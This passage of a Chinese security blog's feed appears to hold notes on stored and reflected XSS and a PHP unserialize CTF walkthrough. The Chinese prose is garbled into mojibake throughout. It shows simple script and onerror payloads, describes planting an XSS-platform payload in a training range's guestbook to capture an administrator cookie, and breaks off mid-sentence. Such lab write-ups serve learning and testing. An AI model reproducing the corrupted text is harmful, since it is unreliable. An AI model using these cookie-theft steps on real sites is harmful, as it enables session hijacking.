ï¼Œå¹¶ä¸”èƒ½å¤ŸæŒç»­çš„æ”»å‡»ç”¨æˆ·ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºæŒä¹…å‹ï¼›</p><p>æˆ‘ä»¬é€šå¸¸æ˜¯é€šè¿‡ä¸€ä¸ªå¼¹çª—å»æ£€éªŒæ˜¯å¦å­˜åœ¨XSS,å¦‚æœæœ‰XSSæ¼æ´ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šä½¿ç”¨XSSå¹³å°å»è·å–å¯¹æ–¹cookieï¼Œç½‘ä¸ŠXSSå¹³å°å…¶å®æœ‰å¾ˆå¤šï¼Œè‡ªè¡Œæœç´¢å³å¯ï¼›</p><h3 id="å­˜å‚¨å‹XSSå¯èƒ½è§¦å‘çš„åœ°æ–¹"><a href="#å­˜å‚¨å‹XSSå¯èƒ½è§¦å‘çš„åœ°æ–¹" class="headerlink" title="å­˜å‚¨å‹XSSå¯èƒ½è§¦å‘çš„åœ°æ–¹"></a>å­˜å‚¨å‹XSSå¯èƒ½è§¦å‘çš„åœ°æ–¹</h3><ul><li>ä»»ä½•å¯ä»¥æ’å…¥åˆ°æ•°æ®åº“çš„åœ°æ–¹</li><li>æ³¨å†Œæäº¤æ¡†</li><li>ç•™è¨€æ¿</li><li>ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</li><li>æŠ¥é”™æ—¥å¿—ä¿¡æ¯(ç®¡ç†å‘˜å¯è§)<br>â€¦â€¦</li></ul><p>æˆ‘ä»¬é€šè¿‡<a href="http://117.41.229.122:8004/Feedback.asp" target="_blank" rel="noopener">æŒæ§å®‰å…¨å…¬å¼€è¯¾é¶åœº</a>ä¸ºä¾‹ï¼š<br>æˆ‘ä»¬ç‚¹å‡»ç½‘é¡µä¸€çœ‹ï¼Œçœ‹è§æœ‰ä¸ªç•™è¨€æ¿ï¼Œé‚£æˆ‘ä»¬åœ¨æƒ³è¿™é‡Œä¼šä¸ä¼šæœ‰æ²¡æœ‰xss?<br>æˆ‘ä»¬é€šè¿‡å¼¹çª—å»æµ‹è¯•æœ‰æ²¡æœ‰XSSæ¼æ´ï¼š</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/7*uFk3MvsKFG57tovZNgRkkCqVvvqiRXK7Cg.PzBVHo!/b/dMAAAAAAAAAA&amp;bo=swTKAwAAAAADJ3w!&amp;rf=viewer_4" alt></p><p>å‘ç°å‡ºç°å¼¹çª—</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Jc8TcgJNtMElfIS6K0NoUpudHzE6xCirF8XnLuQStHY!/b/dFMBAAAAAAAA&amp;bo=dgQ9AQAAAAADF3w!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬è¾“å…¥çš„ä»£ç å·²ç»è¢«æ’å…¥htmlä»£ç å—é‡Œé¢å»äº†</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/wMq3UQ0gc93UieaE5eIkqd2UWTNL*5d2oCrytVsRng4!/b/dAgBAAAAAAAA&amp;bo=yQHFAAAAAAADFz8!&amp;rf=viewer_4" alt></p><p>å› ä¸ºXSS payloadä»£ç å¤æ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸æ˜¯ä½¿ç”¨xsså¹³å°å»è·å–cookie<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JoeGc63sW7v3Qz1e4O7F0yJIUboQItBj7hn2Ls9zYks!/b/dLYAAAAAAAAA&amp;bo=1gbGAQAAAAADFyU!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XKbLcqw40gOT5tuCQDQ3asbNCMMrPwn1g1GO4xbf*A!/b/dL8AAAAAAAAA&amp;bo=uQVmAwAAAAADF.s!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/2LotA1LS9E1m5Ra1m3X15yDrDTYZqJmezvdQJ.BjnHs!/b/dDcBAAAAAAAA&amp;bo=MQU*AwAAAAADFzo!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬å°†å¹³å°ä¸Šçš„payloadå¤åˆ¶ï¼Œæ’å…¥åˆ°æœ‰xssæ¼æ´çš„ç•™è¨€æ¡†å»<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/zsEOEET*L*0nIJ1hX1LePGgHNif.mbwTuOyRFNYFx.c!/b/dFYBAAAAAAAA&amp;bo=egMuAwAAAAADF2Y!&amp;rf=viewer_4" alt></p><p>æ’å…¥æˆåŠŸåï¼Œæˆ‘ä»¬æŸ¥çœ‹xsså¹³å°ï¼ŒæˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜cookie</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/U5uylpL*PqLh2*jjkg1FVvjQZ8*NMIB*b10X78I1hFA!/b/dMIAAAAAAAAA&amp;bo=swRbAgAAAAADF9w!&amp;rf=viewer_4" alt></p><p><strong>å…¶å®xssæ¼æ´å‡ºç°åœ¨ç•™è¨€æ¡†ä¸Šï¼Œè¿˜å¯èƒ½å‡ºç°åœ¨ä¸Šä¼ æ–‡ä»¶åæˆ–æ³¨å†Œé¡µé¢æ¡†ç­‰ä¸æ’å…¥æ•°æ®åº“çš„æäº¤æ¡†ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡jså¼¹çª—è¿›è¡Œæµ‹è¯•ï¼</strong></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xssåŸç†ä¸åˆ†æ</title>
      <link href="/2019/12/07/xss1/"/>
      <url>/2019/12/07/xss1/</url>
      
        <content type="html"><![CDATA[<h2 id="XSSç¼–ç ç»•è¿‡-æµè§ˆå™¨çš„è§£æé¡ºåºï¼š"><a href="#XSSç¼–ç ç»•è¿‡-æµè§ˆå™¨çš„è§£æé¡ºåºï¼š" class="headerlink" title="XSSç¼–ç ç»•è¿‡-æµè§ˆå™¨çš„è§£æé¡ºåºï¼š"></a>XSSç¼–ç ç»•è¿‡-æµè§ˆå™¨çš„è§£æé¡ºåºï¼š</h2><ul><li>æµè§ˆå™¨æœ€æ—©å¼€å§‹è§£æHTMLï¼Œå°†æ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOM èŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTML è§£æå™¨æ˜¯æ— æ³•è¯†åˆ«å“ªäº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOM æ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ã€‚</li></ul><p><strong>åŸºæœ¬çš„è§£æé¡ºåº</strong>æ˜¯-&gt;URL è§£æï¼ŒHTML è§£æï¼Œ CSS è§£æï¼ŒJSè§£æ;</p><p>æµè§ˆå™¨æ¯æ¬¡æ”¶åˆ°æ•°æ®åéƒ½ä¼šè¿›è¡Œè¯­æ³•çš„åˆ†æï¼Œå¦‚æœåˆ†æåˆ°åˆæ³•ç¬¦å·å°±å°†å…¶æ·»åŠ åˆ°è§£ææ ‘ä¸­å»ï¼Œè¯­æ³•åœ¨è§£æç”Ÿæˆdomæ ‘ï¼Œè§£æè¿‡ç¨‹ä¸­å¼€å§‹å¯¹csså…ƒç´ è¿›è¡Œæ¸²æŸ“ï¼Œç„¶åå†å»æ‰§è¡Œjsï¼Œè€Œåœ¨domæ ‘åœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼ŒDOMèŠ‚ç‚¹ä¹Ÿåœ¨æ…¢æ…¢å»ºç«‹èµ·æ¥äº†ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½å‡å¯è¢«ä¿®æ”¹ï¼Œåˆ›å»ºï¼Œæˆ–åˆ é™¤ã€‚</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/PSIywenNZEoKq2vFYg4V4d*sLChskvPr8y.Rkjmlv1c!/b/dL8AAAAAAAAA&amp;bo=9AJOAQAAAAARB4k!&amp;rf=viewer_4" alt></p><h2 id="ä»€ä¹ˆæ˜¯XSSï¼š"><a href="#ä»€ä¹ˆæ˜¯XSSï¼š" class="headerlink" title="ä»€ä¹ˆæ˜¯XSSï¼š"></a>ä»€ä¹ˆæ˜¯XSSï¼š</h2><p>XSSå…¶å®å°±æ˜¯é€šè¿‡æ’å…¥htmlä»£ç è¿›è¡Œæ‹¼æ¥æ³¨å…¥ï¼Œé€šè¿‡æ’å…¥htmlä»£ç å»æ‰§è¡Œå¸¦æœ‰æ¶æ„çš„jsä»£ç ï¼›</p><h2 id="XSSçš„ä½œç”¨ï¼š"><a href="#XSSçš„ä½œç”¨ï¼š" class="headerlink" title="XSSçš„ä½œç”¨ï¼š"></a>XSSçš„ä½œç”¨ï¼š</h2><ul><li>ç›—å–ç®¡ç†å‘˜cookie</li><li>è·å¾—å†…ç½‘çš„ip</li><li>è·å–æµè§ˆå™¨ä¿å­˜çš„æ˜æ–‡å¯†ç </li><li>æˆªå–ç½‘é¡µçš„å±å¹•</li><li>ç½‘é¡µçš„é”®ç›˜è¾“å…¥è®°å½•</li><li>â€¦â€¦</li></ul><p>##XSSçš„ç±»å‹ï¼š</p><ul><li><strong>åå°„å‹XSSï¼š</strong>å®ç°xssæ”»å‡»ï¼Œä½†ä¸å­˜è¿›æ•°æ®åº“ï¼Œåªå¯¹ä½ è¿™æ¬¡è®¿é—®æœ‰å½±å“ï¼Œæ˜¯ä¸­éæŒä¹…å‹çš„æ”»å‡»ï¼ˆä¸€æ¬¡æ€§çš„ï¼‰ï¼›</li><li><strong>å­˜å‚¨å‹ï¼š</strong>å®ç°äº†xssæ”»å‡»ï¼Œä½†å­˜è¿›äº†æ•°æ®åº“ï¼Œæ¯æ¬¡æœ‰äººè®¿é—®è¿™ä¸ªé¡µé¢ï¼Œéƒ½ä¼šè‡ªåŠ¨è§¦å‘ï¼›</li><li><strong>DOMå‹XSSï¼š</strong>ä¸ç»è¿‡åç«¯ï¼ŒDOMâ€”based XSSæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Objeet Model,DOM)çš„ä¸€ç§æ¼æ´ï¼Œdom â€“ xssæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ã€‚</li></ul><h3 id="æ£€æµ‹æ˜¯å¦å­˜åœ¨XSSï¼š"><a href="#æ£€æµ‹æ˜¯å¦å­˜åœ¨XSSï¼š" class="headerlink" title="æ£€æµ‹æ˜¯å¦å­˜åœ¨XSSï¼š"></a>æ£€æµ‹æ˜¯å¦å­˜åœ¨XSSï¼š</h3><p>æœ€ç®€å•çš„å°±æ˜¯æ„é€ è¯­å¥ï¼Œä½¿é¡µé¢å¼¹çª—ï¼Œæˆ‘ä»¬åœ¨æ­£å¸¸é¡µé¢ä¼ å‚æ„é€ å‚æ•°ä½¿ä»–å¼¹çª—ï¼Œå¦‚æœå¼¹çª—ï¼Œè¿™è¯æ˜å°±æ˜¯å­˜åœ¨xssï¼›</p><p><strong>xsså…¶å®æ˜¯é€šè¿‡æ‰§è¡Œjsçš„ä»£ç å»æ‰§è¡Œä¸€äº›æ¶æ„ä»£ç ï¼Œå…¶å®æœ‰å¤šç§æ–¹æ³•å»æ‰§è¡Œjsè¯­å¥ï¼š</strong></p><ul><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ jsæ ‡ç­¾å¯¹<script></script>å»æ‰§è¡Œ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter&apos;123456&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥é€šè¿‡JavaScriptä¼ªåè®®å»è§¦å‘å³å£°æ˜URLçš„ä¸»ä½“æ˜¯ä»»æ„çš„javascriptä»£ç ï¼›</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;a href=javascript:alter(123456)&gt;1&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥é€šè¿‡äº‹ä»¶å»è§¦å‘(å°±æ˜¯åŠ è½½æ–‡æ¡£æˆ–å›¾åƒæ—¶è§¦å‘äº†äº‹ä»¶æ—¶å»å†æ‰§è¡Œjsä»£ç ,å¸¸è§æœ‰onload(æˆåŠŸåŠ è½½æ‰§è¡Œ)ï¼Œonerror(åŠ è½½å¤±è´¥æ‰§è¡Œ)ï¼Œoninput(è¾“å…¥æ—¶æ‰§è¡Œ),onclick(ç‚¹å‡»æ—¶æ‰§è¡Œ))ï¼›</li></ul><p>é€šè¿‡æ’å…¥é”™è¯¯çš„å›¾ç‰‡è·¯å¾„ï¼Œä½¿ä»–åŠ è½½å¤±è´¥æ—¶å»æ‰§è¡Œjsä»£ç ï¼š</p><pre><code>?id=&lt;img src=&apos;6666&apos; onerror=alert&apos;123456&apos;&gt;</code></pre><p>ä»¥ä¸Šä¸¾ä¾‹éƒ½æ˜¯å±äºåå°„å‹çš„xssï¼Œéœ€è¦æ‰‹åŠ¨å»æ‰§è¡Œï¼Œç„¶åè§¦å‘æˆ‘ä»¬å»æ’å…¥çš„ä»£ç æ•ˆæœï¼›</p><p>å½“ç„¶è¿˜æœ‰è®¸å¤šè½¬ä¹‰çš„æƒ…å†µå­˜åœ¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ­¥æ­¥æ£€æŸ¥ï¼Œæƒ³åŠæ³•å»å˜å½¢ç»•è¿‡ï¼Œä»è€Œå»æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼›</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP unserializeååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-serialize"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-serialize" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–(serialize)?"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–(serialize)?</h2><p>åºåˆ—åŒ–(serialize)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯<strong>è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“</strong>çš„è¿‡ç¨‹ï¼Œåœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºï¼Œç„¶å<strong>å¯ä»¥ä»å­˜å‚¨åŒºè¯»å–æˆ–ååºåˆ—åŒ–å‡ºå¯¹è±¡çš„çŠ¶æ€ï¼Œ</strong>é‡æ–°å°†å¯¹è±¡åˆ›å»ºå‡ºæ¥ã€‚é€šä¿—çš„è¯´ï¼Œå°±æ˜¯å°†phpä¸­å¯¹è±¡ã€ç±»ã€æ•°ç»„ã€å˜é‡åŒ¿åå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œæ–¹ä¾¿ä¿å­˜åˆ°æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ã€‚</p><p>åœ¨phpä¸­ï¼Œå¯ä»¥é€šè¿‡serialize()å‡½æ•°æ¥å°†å¯¹è±¡è½¬å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¿å­˜å¯¹è±¡çš„å€¼ï¼Œæ–¹ä¾¿ä¹‹åä½¿ç”¨æˆ–ä¼ é€’ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–-unserialize"><a href="#ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–-unserialize" class="headerlink" title="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–(unserialize)?"></a>ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–(unserialize)?</h2><p>åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬ä¸ºå­—ç¬¦ä¸²å­˜å‚¨èµ·æ¥ï¼Œé‚£ä¹ˆååºåˆ—åŒ–å°±æ˜¯å†å°†ä¿¡æ¯çŠ¶æ€æ‹¿å‡ºæ¥ä½¿ç”¨(é‡æ–°è½¬åŒ–ä¸ºå¯¹è±¡æˆ–è€…å…¶ä»–)ï¼›</p><h2 id="ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ"><a href="#ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ"></a>ååºåˆ—åŒ–æ¼æ´çš„äº§ç”Ÿ</h2><p>æœ¬è´¨ä¸Šserialize()å’Œunserialize()åœ¨PHPå†…éƒ¨å®ç°ä¸Šæ—¶æ²¡æœ‰æ¼æ´çš„ï¼Œæ¼æ´çš„**ä¸»è¦äº§ç”Ÿæ˜¯ç”±äºåº”ç”¨ç¨‹åºåœ¨å¤„ç†å¯¹è±¡ã€é­”æœ¯å‡½æ•°ä»¥åŠåºåˆ—åŒ–ç›¸å…³é—®é¢˜çš„æ—¶å€™å¯¼è‡´çš„ã€‚</p><p>å½“ä¼ ç»™unserialize()çš„<strong>å‚æ•°å¯æ§</strong>æ—¶,é‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥ç²¾å¿ƒæ„é€ çš„payloadã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­ä¸€äº›<strong>é­”æœ¯æ–¹æ³•</strong>ï¼Œé€ æˆæ„å‘ä¸åˆ°çš„å±å®³ã€‚</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wfphoej31hc0q876u.jpg" alt><br><strong>åºåˆ—åŒ–å¯¹äºä¸åŒç±»å‹å¾—åˆ°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸ºï¼š</strong></p><ul><li>String : s:size:value;</li><li>Integer : i:value;</li><li>Boolean : b:value;(1æˆ–0)</li><li>Null : N;</li><li>Array : a:size:{key definition;value definition;(repeated per element)}</li><li>Object : O:strlen:object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li></ul><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p>_construct()ï¼Œ <strong>destruct()ï¼Œ </strong>call()ï¼Œ <strong>callStatic()ï¼Œ </strong>get()ï¼Œ <strong>set()ï¼Œ </strong>isset()ï¼Œ<strong>unset()ï¼Œ </strong>sleep()ï¼Œ <strong>wakeup()ï¼Œ </strong>toString()ï¼Œ <strong>invoke()ï¼Œ </strong>set_state()ï¼Œ<strong>clone() å’Œ </strong>debugInfo() ç­‰æ–¹æ³•åœ¨ PHP ä¸­è¢«ç§°ä¸ºâ€é­”æœ¯æ–¹æ³•</p><p>é­”æœ¯æ–¹æ³•æ˜¯PHPé¢å‘å¯¹è±¡ä¸­ç‰¹æœ‰çš„ç‰¹æ€§ã€‚å®ƒä»¬åœ¨ç‰¹å®šçš„æƒ…å†µä¸‹è¢«è§¦å‘ï¼Œéƒ½æ˜¯ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´ï¼Œåˆ©ç”¨æ¨¡å¼æ–¹æ³•å¯ä»¥è½»æ¾å®ç°PHPé¢å‘å¯¹è±¡ä¸­é‡è½½ã€‚<br>æˆ‘ä»¬å…ˆç®€å•ä»‹ç»å‡ ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæƒ³è¯¦ç»†äº†è§£çš„è¯ï¼Œç‚¹å‡»<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">é­”æœ¯æ–¹æ³•</a>;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>å½“æˆ‘ä»¬è°ƒè¯•ç¨‹åºæ—¶ï¼Œéœ€è¦çŸ¥é“æ˜¯å¦å¾—å‡ºæ­£ç¡®çš„æ•°æ®ã€‚æ¯”å¦‚æ‰“å°ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œçœ‹çœ‹è¿™ä¸ªå¯¹è±¡éƒ½æœ‰å“ªäº›å±æ€§ï¼Œå…¶å€¼æ˜¯ä»€ä¹ˆï¼Œå¦‚æœç±»å®šä¹‰äº†toStringæ–¹æ³•ï¼Œå°±èƒ½åœ¨æµ‹è¯•æ—¶ï¼Œ<strong>echoæ‰“å°å¯¹è±¡ä½“ï¼Œå¯¹è±¡å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒæ‰€å±ç±»å®šä¹‰çš„toStringæ–¹æ³•ï¼Œ</strong>æ ¼å¼åŒ–è¾“å‡ºè¿™ä¸ªå¯¹è±¡æ‰€åŒ…å«çš„æ•°æ®ã€‚</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>å½“å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šä¸»åŠ¨è°ƒç”¨ã€‚ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚ï¼ˆæ„é€ å‡½æ•°ï¼‰</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ï¼ˆææ„å‡½æ•°ï¼‰</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>å¦‚å‰æ‰€æï¼Œunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼›</p><h2 id="é¶åœºå®è·µ"><a href="#é¶åœºå®è·µ" class="headerlink" title="é¶åœºå®è·µ"></a>é¶åœºå®è·µ</h2><p>æˆ‘ä»¬è¿›å…¥é¶åœºï¼Œæˆ‘ä»¬çœ‹åˆ°è¿™æ ·ä¸€ä¸ªç•Œé¢ï¼Œä»–å«æˆ‘ä»¬æ£€æŸ¥ä»£ç ï¼Œé‚£æˆ‘ä»¬å°±ç‚¹è¿›å»æŠŠï¼<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wrzoupj31h70q8dgk.jpg" alt><br>è¿™æ˜¯ä¸€é“ctfååºåˆ—åŒ–é¢˜ç›®ï¼Œçœ‹åˆ°æç¤ºflagå°±è—åœ¨æœ¬é¡µé¢ä¸­åŒä¸€ç›®å½•çš„flag.phpä¸­ï¼Œæˆ‘ä»¬å®¡è®¡ä¸‹ä»£ç <br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0x1m4jej31hc0regmc.jpg" alt><br>â‘ .å‰é¢å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè€Œä¸”è¿˜æ˜¯ä½¿ç”¨é­”æœ¯æ–¹æ³•<strong>toString,é‡Œé¢è¿”å›äº†readme.txtå’Œè°ƒç”¨æ˜¾ç¤ºsource,å› ä¸ºåœ¨</strong>toStringé­”æœ¯æ–¹æ³•ä¸­ï¼Œæ‰€ä»¥åªè¦å°†å¯¹è±¡ä½“æ‰“å°(echo)å‡ºæ¥å°±èƒ½è°ƒç”¨ã€‚<br>highlight_fileæ˜¯é«˜äº®æ˜¾ç¤ºæ–‡ä»¶ä»£ç çš„æ„æ€ï¼›</p><p>â‘¡.åœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­ä¸­ï¼Œå¦‚æœå­˜åœ¨sourceä»¥GETæ–¹å¼è¯·æ±‚çš„è¯ï¼Œå°±ä¼šå®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ä½¿source=<strong>FILE</strong>,<strong>FILE</strong>æŒ‡æœ¬åœ°å½“å‰æ–‡ä»¶è·¯å¾„ï¼Œé‚£å°±æ˜¯è¯´ä¼šè°ƒç”¨$så¯¹è±¡ä¸­çš„sourceå¹¶ä½¿å…¶ç­‰äº<strong>FILE</strong>,<strong>FILE</strong>è¡¨ç¤ºå½“å‰é¡µé¢çš„å®Œæ•´è·¯å¾„ï¼Œå³ä¼šè¯»å–å½“å‰é¡µé¢ï¼Œå¹¶å°†å¯¹è±¡ä½“æ‰“å°å‡ºæ¥ï¼Œé‚£ä¹ˆä¸Šé¢çš„__toSteingä¹Ÿä¼šè¢«è°ƒç”¨ã€‚</p><p>â‘¢.å¦‚æœæœ‰å­˜åœ¨todosè¿™ä¸ªcookieï¼Œé‚£å°±<strong>æˆªå–cookieå‰32ä½é•¿åº¦ï¼Œä¸å‰32ä½ä¹‹åé•¿åº¦ç›¸å¯¹æ¯”ï¼Œå¦‚æœç›¸ç­‰ï¼Œå°±å°†cookieå‰32ä½ä¹‹åçš„é•¿åº¦è¿›è¡Œååºåˆ—åŒ–ã€‚</strong>é‚£å¦‚æœ$_COOKIE[â€˜todosâ€™]æ˜¯å¯æ§çš„ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½<strong>æ„é€ payloadè®©â‘¡çš„<strong>FILE</strong>æ–‡ä»¶æ”¹æˆæˆ‘ä»¬æƒ³è¯»å–çš„flag.phpæ–‡ä»¶ï¼Œå¹¶å°†å…¶åºåˆ—åŒ–ï¼Œå¹¶æ”¾åˆ°cookieä¸­ï¼Œå¹¶ä½¿æ¡ä»¶æˆç«‹ï¼Œä½¿å¾—å°†æˆ‘ä»¬æƒ³è¦æ–‡ä»¶è¢«ååºåˆ—åŒ–åè¾“å‡ºå‡ºæ¥</strong>ï¼Œä½†æˆ‘ä»¬è¿˜æ²¡çœ‹åˆ°è¾“å‡ºçš„ç‚¹ã€‚</p><p>åé¢æˆ‘ä»¬å‘ç°äº†è¿™ä¸ª<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xew1wlj30hg0p8q37.jpg" alt><br>&lt;?=$todo?&gt;æ˜¯&lt;?php echo $todo ?&gt;çš„ç®€å†™ï¼›<br>è€Œ$todoæ˜¯æ ¹æ®$todosæ•°ç»„ foreachéå†å‡ºæ¥çš„å€¼</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xm802pj31hb0f9aaf.jpg" alt><br>æˆ‘ä»¬å°†<strong>FILE</strong>æ”¹æˆæˆ‘ä»¬è¦è¯»å–çš„æ–‡ä»¶åï¼Œ<strong>å› ä¸ºåªæœ‰æ•°ç»„æ‰èƒ½foreachéå†å‡ºå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†åºåˆ—åŒ–çš„å¯¹è±¡å…ˆè½¬æ¢æˆæ•°ç»„</strong>ï¼Œç„¶åæ˜¯åºåˆ—åŒ–å‡ºæ¥ç»“æœã€‚</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xvqj2aj30f404uq2r.jpg" alt><br>ç„¶åæˆ‘ä»¬è¦åšçš„ä¸‹ä¸€æ­¥æ˜¯é€šè¿‡è®©cookieæ»¡è¶³æ¡ä»¶ï¼Œä½¿cookieå‰32ä½ä¸ä¹‹åçš„ç›¸ç­‰ï¼Œå¦‚æœæ¡ä»¶æˆç«‹ï¼Œé‚£ä¹ˆå°±ä¼šå®è¡Œååºåˆ—åŒ–å‡ºç»“æœï¼Œå¹¶å°†å…¶ç»“æœèµ‹ç»™$todosè¿™ä¸ªæ•°ç»„ï¼Œç„¶åéå†flag.phpè¾“å‡ºç»“æœã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬åºåˆ—åŒ–çš„ç»“æœæ‹¼æ¥éƒ½æ”¾è¿›cookieä¸­å»ï¼Œä½¿å…¶æ¡ä»¶æ»¡è¶³ï¼Œååºåˆ—åŒ–å‡ºæˆ‘ä»¬éœ€è¦çš„ç»“æœ</p><p>å› ä¸ºcookieå‰32ä½$hè¦ç­‰äº32ä½ä¹‹åmd5åŠ å¯†åçš„å€¼$mï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰‹åŠ¨å°†å‰32ä½è¿›è¡Œæ‰‹åŠ¨md5åŠ å¯†ï¼Œä½¿å…¶ç­‰äº32ä½ä»¥åçš„å€¼ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0y37gnij31hc0rh77y.jpg" alt><br><code>$h=e2d4f7dcc43ee1db7f69e76303d0105c(æ‰‹åŠ¨md5åŠ 